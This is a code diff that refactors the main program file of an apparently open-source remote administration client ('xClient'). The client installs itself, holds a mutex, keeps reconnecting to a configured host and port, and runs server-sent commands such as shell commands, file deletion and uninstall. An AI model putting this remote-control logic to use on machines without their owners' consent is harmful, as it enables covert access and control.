@@ -6,16 +6,15 @@ using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
 using xClient.Core.Packets;
-using xClient.Core.Packets.ServerPackets;
 
 namespace xClient
 {
     static class Program
     {
-        public static xClient.Core.Client _Client;
-        private static bool Reconnect = true;
-        private static volatile bool Connected = false;
-        private static Mutex AppMutex;
+        public static Client ConnectClient;
+        private static bool _reconnect = true;
+        private static volatile bool _connected = false;
+        private static Mutex _appMutex;
 
         [STAThread]
         private static void Main(string[] args)
@@ -29,13 +28,13 @@ namespace xClient
 
             //close here
             CommandHandler.CloseShell();
-            if (AppMutex != null)
-                AppMutex.Close();
+            if (_appMutex != null)
+                _appMutex.Close();
         }
 
         private static void Initialize()
         {
-            System.Threading.Thread.Sleep(2000);
+            Thread.Sleep(2000);
 
             SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
             SystemCore.MyPath = Application.ExecutablePath;
@@ -54,7 +53,7 @@ namespace xClient
 
             if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
             {
-                if (!SystemCore.CreateMutex(ref AppMutex))
+                if (!SystemCore.CreateMutex(ref _appMutex))
                     SystemCore.Disconnect = true;
 
                 if (SystemCore.Disconnect)
@@ -62,9 +61,9 @@ namespace xClient
 
                 new Thread(SystemCore.UserIdleThread).Start();
 
-                _Client = new Core.Client(8192);
+                ConnectClient = new Client(8192);
 
-                _Client.AddTypesToSerializer(typeof (IPacket), new Type[]
+                ConnectClient.AddTypesToSerializer(typeof (IPacket), new Type[]
                 {
                     typeof (Core.Packets.ServerPackets.InitializeCommand),
                     typeof (Core.Packets.ServerPackets.Disconnect),
@@ -102,12 +101,12 @@ namespace xClient
                     typeof (Core.Packets.ClientPackets.ShellCommandResponse)
                 });
 
-                _Client.ClientState += ClientState;
-                _Client.ClientRead += ClientRead;
+                ConnectClient.ClientState += ClientState;
+                ConnectClient.ClientRead += ClientRead;
             }
             else
             {
-                if (!SystemCore.CreateMutex(ref AppMutex))
+                if (!SystemCore.CreateMutex(ref _appMutex))
                     SystemCore.Disconnect = true;
 
                 if (SystemCore.Disconnect)
@@ -122,15 +121,15 @@ namespace xClient
             TryAgain:
             Thread.Sleep(250 + new Random().Next(0, 250));
 
-            if (!Connected)
-                _Client.Connect(Settings.HOST, Settings.PORT);
+            if (!_connected)
+                ConnectClient.Connect(Settings.HOST, Settings.PORT);
 
             Thread.Sleep(200);
 
             Application.DoEvents();
 
             HoldOpen:
-            while (Connected) // hold client open
+            while (_connected) // hold client open
             {
                 Application.DoEvents();
                 Thread.Sleep(2500);
@@ -140,31 +139,31 @@ namespace xClient
 
             if (SystemCore.Disconnect)
             {
-                _Client.Disconnect();
+                ConnectClient.Disconnect();
                 return;
             }
 
-            if (Reconnect && !SystemCore.Disconnect && !Connected)
+            if (_reconnect && !SystemCore.Disconnect && !_connected)
                 goto TryAgain;
             else
                 goto HoldOpen;
         }
 
-        private static void ClientState(Core.Client client, bool connected)
+        private static void ClientState(Client client, bool connected)
         {
-            Connected = connected;
+            _connected = connected;
 
             if (connected && !SystemCore.Disconnect)
-                Reconnect = true;
+                _reconnect = true;
             else if (!connected && SystemCore.Disconnect)
-                Reconnect = false;
+                _reconnect = false;
             else
-                Reconnect = !SystemCore.Disconnect;
+                _reconnect = !SystemCore.Disconnect;
         }
 
-        private static void ClientRead(Core.Client client, IPacket packet)
+        private static void ClientRead(Client client, IPacket packet)
         {
-            Type type = packet.GetType();
+            var type = packet.GetType();
 
             if (type == typeof (Core.Packets.ServerPackets.InitializeCommand))
             {
@@ -181,11 +180,13 @@ namespace xClient
             }
             else if (type == typeof (Core.Packets.ServerPackets.Disconnect))
             {
+                CommandHandler.CloseShell();
                 SystemCore.Disconnect = true;
                 client.Disconnect();
             }
             else if (type == typeof (Core.Packets.ServerPackets.Reconnect))
             {
+                CommandHandler.CloseShell();
                 client.Disconnect();
             }
             else if (type == typeof (Core.Packets.ServerPackets.Uninstall))
@@ -256,7 +257,7 @@ namespace xClient
             {
                 CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete) packet, client);
             }
-            else if (type == typeof (Action))
+            else if (type == typeof(Core.Packets.ServerPackets.Action))
             {
                 CommandHandler.HandleAction((Core.Packets.ServerPackets.Action) packet, client);
             }
